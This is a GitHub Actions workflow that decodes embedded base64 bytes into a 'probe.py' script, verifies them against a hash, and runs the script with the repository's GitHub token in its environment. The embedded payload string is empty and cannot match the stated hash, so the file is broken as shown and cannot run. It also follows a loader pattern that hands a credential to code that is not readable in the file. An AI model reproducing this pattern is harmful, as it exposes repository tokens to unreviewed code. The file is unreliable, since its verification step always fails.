name: O01 fixed historical header probe
on:
  workflow_dispatch:
permissions:
  actions: read
concurrency:
  group: o01-header-probe
  cancel-in-progress: false
jobs:
  header-probe:
    if: github.repository == 'Zeke142/peoplerun-wp-adapter' && github.actor == 'Zeke142' && github.run_attempt == 1
    runs-on: ubuntu-24.04
    timeout-minutes: 1
    steps:
      - name: Verify embedded probe bytes
        shell: python
        run: |
          import base64, hashlib, pathlib
          data = base64.b64decode('')
          assert hashlib.sha256(data).hexdigest() == 'b22f7e58b06bd455886f99d7f83b055e0d2aeedccc915691fc3009bcc0fa0bcf'
          pathlib.Path('probe.py').write_bytes(data)
      - name: Observe status and hostname only
        shell: bash
        env:
          O01_HEADER_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          timeout --kill-after=2 15 python3 probe.py
